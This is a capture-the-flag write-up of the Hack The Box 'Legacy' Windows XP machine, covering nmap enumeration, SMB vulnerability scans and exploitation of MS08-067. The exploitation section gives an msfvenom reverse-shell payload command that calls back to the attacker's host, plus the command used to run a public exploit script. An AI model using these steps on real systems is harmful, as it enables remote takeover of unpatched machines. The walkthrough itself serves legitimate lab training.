Title: HTB Legacy box writeup
Tags: oscp, htb
Summary: Quite short walkthrough for this little box
Date: 31/08/2020 15:30
Status: published

Starting series of writeups for a list of machines compiled by TJNull in his well-known 
[blog post](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html#vulnerable-machines).

# Enumeration
Let's dig into this box. We are not restricted with traffic amount or something like that, so I just spinned up the full nmap scan with `-sS`:

<pre>

    # Nmap 7.80 scan initiated Wed Aug 26 12:28:33 2020 as: nmap -sS -p- -oA nmap/nmap-ss-all 10.10.10.4
    Nmap scan report for legacy.htb (10.10.10.4)
    Host is up (0.12s latency).
    Not shown: 65532 filtered ports
    PORT     STATE  SERVICE
    139/tcp  open   netbios-ssn
    445/tcp  open   microsoft-ds
    3389/tcp closed ms-wbt-server

    # Nmap done at Wed Aug 26 12:31:39 2020 -- 1 IP address (1 host up) scanned in 186.30 seconds

</pre>
Unfortunately, SMB server does not allow anonymous logon since `smbclient -N -L \\\\10.10.10.4\\` fails.

Not much ports open there, seems to be only SMB server available at the time. Let's try to dig some more with `-A` and `-sV` on discovered ports:

<pre>

    # Nmap 7.80 scan initiated Wed Aug 26 12:35:32 2020 as: nmap -A -T4 -sV -O -p139,445 -oA nmap/nmap-AT4sVO-open 10.10.10.4
    Nmap scan report for legacy.htb (10.10.10.4)
    Host is up (0.18s latency).

    PORT    STATE SERVICE      VERSION
    139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp open  microsoft-ds Windows XP microsoft-ds
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2000|XP|2003 (90%)
    OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 
    cpe:/o:microsoft:windows_server_2003 
    Aggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (90%), 
    Microsoft Windows XP SP2 or Windows Small Business Server 2003 (90%), Microsoft Windows XP SP2 (89%), 
    Microsoft Windows Server 2003 (87%), Microsoft Windows XP SP2 or SP3 (87%), Microsoft Windows XP SP3 (87%), 
    Microsoft Windows 2000 SP4 (86%), Microsoft Windows XP Professional SP2 (86%), Microsoft Windows XP Professional SP3 (86%), 
    Microsoft Windows XP SP2 or Windows Server 2003 (86%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

    Host script results:
    |_clock-skew: mean: -4h27m15s, deviation: 2h07m16s, median: -5h57m15s
    |_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:3d:03 (VMware)
    | smb-os-discovery: 
    |   OS: Windows XP (Windows 2000 LAN Manager)
    |   OS CPE: cpe:/o:microsoft:windows_xp::-
    |   Computer name: legacy
    |   NetBIOS computer name: LEGACY\x00
    |   Workgroup: HTB\x00
    |_  System time: 2020-08-26T12:38:29+03:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    |_smb2-time: Protocol negotiation failed (SMB2)

    TRACEROUTE (using port 139/tcp)
    HOP RTT       ADDRESS
    1   120.17 ms 10.10.14.1
    2   290.33 ms legacy.htb (10.10.10.4)

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Aug 26 12:36:36 2020 -- 1 IP address (1 host up) scanned in 63.88 seconds

</pre>
Well it's really seems to be _legacy_ since nmap suggests that this box running Windows XP. Though these results may not be accurate, `smb-os-discovery` also
suggests so, I'll take a mental note about this - it might be vulnerable to some antediluvian vulnerabilities.  
Nmap has some more interesting scripts for SMB, worth trying to scan using them:
<pre>

    # Nmap 7.80 scan initiated Wed Aug 26 12:49:00 2020 as: nmap -p445,139 --script=smb-vuln* -oA nmap/smb-vuln-mass 10.10.10.4
    Nmap scan report for legacy.htb (10.10.10.4)
    Host is up (0.12s latency).

    PORT    STATE SERVICE
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

    Host script results:
    | smb-vuln-ms08-067: 
    |   VULNERABLE:
    |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
    |     State: LIKELY VULNERABLE
    |     IDs:  CVE:CVE-2008-4250
    |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
    |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
    |           code via a crafted RPC request that triggers the overflow during path canonicalization.
    |           
    |     Disclosure date: 2008-10-23
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
    |_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

    # Nmap done at Wed Aug 26 12:49:07 2020 -- 1 IP address (1 host up) scanned in 7.25 seconds

</pre>
Gotcha! Notice that it's 'likely vulnerable' to CVE-2008-4250 (MS08-067). Pretty old vulnerability, this looks consonant
with box name. 

# Exploitation
There is some exploit code for MS08-67 in [github](https://github.com/andyacer/ms08_067.git). Looks neat, without pranks or `rm -rf` stuff within.
I've just generated payload with `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.8 LPORT=53 EXITFUNC=thread -f c -o shell.c -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"`
and put that shellcode instead of the one that was in the script already. Initially I forgot to set badchars and it was not working for that reason, but
eventually I read the exploit script and notices some examples. Lesson learned - do not hurry! I must have thought that this exploit is broken or something
if I didn't read carefully.  
Exploit script had multiple choices for targets, I decided to start from end and used `./ms08_067_2018.py 10.10.10.4 7 445` - bullseye! Shell popped out on my 
`multi/handler` running.

# Post-exploitation
As per `systeminfo` this box is indeed running Windows XP SP3. Unfortunately it doesn't have `whoami` in the command line shell and `echo %USERNAME%` didn't work
for some reason (emitted nothing). So I had to determine current user by indirect methods. First, I suggest that since SMB server service got exploited, it's likely
a SYSTEM shell. Two little commands to prove that hypothesis. Who wants to go directly for the root flag? That's boring :)  
First command is `set`, which will show us some current envars:

![set output](/cstatic/htb-legacy/set.png)

Take a look at `USERPROFILE` envar - it shows us a special folder.

Second command is `reg query "HKU\S-1-5-19"` which tries to query some keys that only administrator could get.

![reg query output](/cstatic/htb-legacy/hku.png)

We indeed having at least administrative rights on this box. Safe to go ahead and grab root flag:

![root flag](/cstatic/htb-legacy/flag.png)
